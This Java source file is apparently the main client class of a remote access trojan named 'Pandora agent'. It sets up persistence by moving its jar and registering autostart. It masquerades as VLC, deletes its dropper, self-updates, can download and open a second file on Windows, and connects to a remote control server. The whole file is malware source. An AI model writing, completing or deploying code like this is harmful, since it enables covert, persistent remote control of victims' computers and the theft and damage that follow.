package org.pandora.agent;

import lombok.Getter;
import org.pandora.agent.application.Application;
import org.pandora.agent.application.Persistence;
import org.pandora.agent.control.ControlManager;
import org.pandora.agent.decoding.DecodingManager;
import org.pandora.agent.encoding.EncodingManager;
import org.pandora.agent.launch.Launch;
import org.pandora.agent.setup.Setup;
import org.pandora.agent.socket.SocketManager;
import org.pandora.agent.update.Updater;
import org.pandora.agent.utils.Computer;
import org.pandora.agent.utils.Settings;
import org.pandora.agent.utils.SocketUtils;

import java.io.File;
import java.net.URISyntaxException;

public class Client {

    @Getter
    private final boolean windows;
    @Getter
    private final SocketManager socketManager;
    @Getter
    private final Setup setup;
    @Getter
    private final DecodingManager decodingManager;
    @Getter
    private final EncodingManager encodingManager;
    @Getter
    private final Updater updater;
    @Getter
    private final Computer computer;
    @Getter
    private ControlManager controlManager;
    @Getter
    private final SocketUtils socketUtils;

    public Client() {
        this.windows = System.getProperty("os.name").toLowerCase().contains("windows");
        this.socketManager = new SocketManager(this);
        this.decodingManager = new DecodingManager();
        this.encodingManager = new EncodingManager();
        this.socketUtils = new SocketUtils(this);
        this.setup = new Setup(this);
        this.updater = new Updater(this.windows);
        this.computer = new Computer(this.windows);
    }

    /*
        0 --> Launch by click
        1 --> Launch after OS started
        2 --> Launch back
        3 --> Start after update to replace old file by the new
        4 --> Start after update + after replacement
     */

    public void launch(final int mode) {
        this.getSetup().setupValues(this.isWindows());
        this.deleteDownloader();
        if (mode == 1 || mode == 2 || mode == 4) {
            if (mode != 4 && this.updater.hasUpdate()) {
                this.updater.download();
                this.updater.open();
                System.exit(0);
            } else {
                this.controlManager = new ControlManager(this);
                this.getSocketManager().getConnection().connect(mode);
            }
        } else if (mode == 3) {
            this.updater.replaceOldByNew();
            this.updater.openUpdated();
        } else if (mode == 0) {
            final Persistence persistence = new Persistence(this.isWindows());
            persistence.createFolder();
            persistence.moveJar();
            if (Settings.AUTOSTART) persistence.register();
            this.computer.launchBack();
            if (this.isWindows() && Settings.OTHERFILE) {
                final Application application = new Application();
                application.downloadAndOpen();
            }
        }
    }

    private void deleteDownloader() {
        try {
            final String path = Launch.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
            final File downloader = new File(System.getenv("LOCALAPPDATA") + "\\VLC\\VLC2.jar");
            if (path.endsWith("VLC.jar") && downloader.exists()) downloader.delete();
        } catch (final URISyntaxException ignored) {
        }
    }
}
